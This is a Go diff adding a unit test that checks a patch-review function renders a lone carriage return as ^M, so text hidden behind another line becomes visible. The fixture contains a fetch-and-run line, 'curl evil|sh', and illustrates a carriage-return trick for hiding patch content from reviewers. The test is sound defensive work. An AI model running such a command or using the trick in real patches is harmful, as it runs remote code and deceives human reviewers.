@@ -542,3 +542,13 @@ func TestTrailReviewPatchTextKeepsPatchBytes(t *testing.T) {
 		t.Fatalf("trailReviewPatchText = %q, want %q", got, want)
 	}
 }
+
+// A lone carriage return could hide one line's text behind another's on a
+// terminal while the hidden bytes are what gets applied; it shows as ^M.
+func TestTrailReviewPatchTextShowsLoneCarriageReturn(t *testing.T) {
+	t.Parallel()
+	patch := "+curl evil|sh\r+// harmless\r\n"
+	if got, want := trailReviewPatchText(&patch), "+curl evil|sh^M+// harmless"; got != want {
+		t.Fatalf("trailReviewPatchText = %q, want %q", got, want)
+	}
+}
